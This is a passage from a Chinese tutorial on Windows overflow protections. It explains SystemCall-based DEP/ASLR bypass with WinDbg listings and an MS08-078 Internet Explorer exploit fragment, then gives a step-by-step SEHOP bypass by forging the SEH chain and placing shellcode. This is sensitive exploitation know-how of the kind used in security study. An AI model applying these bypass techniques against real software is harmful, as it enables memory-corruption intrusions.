ntdll!\_KUSER\_SHARED\_DATA
...
   +0x300 SystemCall       : 0x77966340
   +0x304 SystemCallReturn : 0x77966344
0:000> u 77966340
ntdll!KiFastSystemCall:
77966340 8bd4            mov     edx,esp
77966342 0f34            sysenter
```

（2） `Windows` 用户模式进入内核模式时：

```
0:000> u ZwCreateProcess
ntdll!NtCreateProcess:
77964940 b84f000000      mov     eax,4Fh
77964945 ba0003fe7f      mov     edx,offset SharedUserData!SystemCallStub (7ffe0300)
7796494a ff12            call    dword ptr [edx]
7796494c c22000          ret     20h
```

通过手工构造 `System Call` 的参数

并且用 `System Call` 的技术来绕过 `DEP&ALSR`

（3）`IE MS08-078 exploit with SystemCall on windows`

通过堆喷射的方法在内存中填充 `SystemCall` 的地址

在 `exploit` 中使用 `SystemCall` 地址

```
.text:461E3D30 mov eax, [esi] //eax==0x0a0a11c8
  ....         // 0x11c8 be a systemcall ID
.text:461E3D4C mov ecx, [eax]   // [0x0a0a11c8]==0x7ffe027c
.text:461E3D4E push edi
.text:461E3D4F push eax   //eax==0x0a0a11c8
.text:461E3D50 call dword ptr [ecx+84h] //call [0x7FFE0300] SystemCall
```

以上代码等同于调用 `NtUserLockWorkStation`

```
mov eax,11c8h
mov edx,offset SharedUserData!SystemCallStub (7ffe0300)
call dword ptr [edx]
```

（4）`System call on x64`

`7ffe0300` 不再存放 `KiFastSystemCall` 的地址

通过 `call dword ptr fs:[0C0h]` 指令来代替系统调用的方法

```
0:000> u NtQueryInformationToken
ntdll!NtQueryInformationToken:
77d9fb38 b81e000000 mov eax,1Eh
77d9fb3d 33c9 xor ecx,ecx
77d9fb3f 8d542404 lea edx,[esp+4]
77d9fb43 64ff15c0000000 call dword ptr fs:[0C0h]
77d9fb4a 83c404 add esp,
```

## 五、SEHOP

原理：微软在 `Microsoft Windows 2008 SP0`、`Microsoft Windows Vista SP1` 和 `Microsoft Windows 7` 中加入了另一种新的保护机制 `SEHOP`（`Structured Exception Handling Overwrite Protection`），它可作为 `SEH` 的扩展，用于检测 `SEH` 是否被覆写。`SEHOP` 的核心特性是用于检测程序栈中的所有 `SEH` 结构链表的完整性，特别是对最后一个 `SHE` 结构的检测。在最后一个 `SEH` 结构中拥有一个特殊的异常处理函数指针，指向一个位于 `ntdll` 中的函数 `ntdll!FinalExceptHandler`（）。当我们用 `jmp 06 pop pop ret` 来覆盖 `SEH` 结构后，由于 `SEH` 结构链表的完整性遭到破坏，`SEHOP` 就能检测到异常从而阻止 `shellcode` 的运行

### 绕过方法：

伪造 `SEH` 链表

由于 `SEHOP` 会检测 `SEH` 链表的完整性，那么我们可以通过伪造 `SEH` 链表来替换原先的 `SEH` 链表，进而达到绕过的目的。具体实现方法：

（1）查看 `SEH` 链表结构，可借助 `OD` 实现，然后记住最后一个 `SEH` 结构地址，以方便后面的利用；
（2）用 `JE(0x74)` + 最后一个 `SEH` 结构的地址（由于地址开头是 `00`，故可省略掉，可由 `0x74` 替代，共同实现 4 字节对齐）去覆盖 `nextSEH`；
（3）用 `xor pop pop ret` 指令地址去覆盖 `SEH handle`，其中的 `xor` 指令是用于将 `ZF` 置位，使前面的 `JE` = `JMP` 指令，进而实现跳转；
（4）在这两个 `SEH` 结构之前写入一跳转指令（`JMP+8`），以避免数据段被执行；
（5）在这两个 `SEH` 结构之间全部用 `NOP` 填充，如果两者之间还有其它 `SEH` 结构的话；
（6）将 `shellcode` 放置在最后一个 `SEH` 结构之后，即 `ntdll!FinalExceptHandler`（）函数之后。

此时的堆栈布局如下：

```
┏━━━━━━━━━━━━┓
【    NOP…      】
【   JMP 08      】
【  JE XXXXXX    】<= next SEH(指向前面的 NOP)
【     xor pop pop ret    】<= SEH Handler
【    NOP…      】
【   JMP 08      】
【  0xFFFFFFFF    】<= next SEH  
【ntdll!FinalExceptHandler】<= SEH Handler
【  shellcode    】
┗━━━━━━━━━━━━┛  
```

更多信息可参见我之前翻译的《绕过 SEHOP 安全机制》：http://bbs.pediy.com/showthread.php?t=104707

## 结论

本文简单地叙述了 `windows` 平台上的各类溢出保护机制及其绕过方法，但若结合实例分析的话，没有几万字是不可能完成的，因此这里概览一番，读者若想获得相关的实例运用的资料，可参考文中提及一些 `paper`，特别是由看雪论坛上 `dge` 兄弟翻译的《`Exploit` 编写系列教程 6》以及黑客杂志《`Phrack`》、《`Uninformed`》上的相关论文。微软与黑客之间的斗争是永无休止的，我们期待着下一项安全机制的出现……
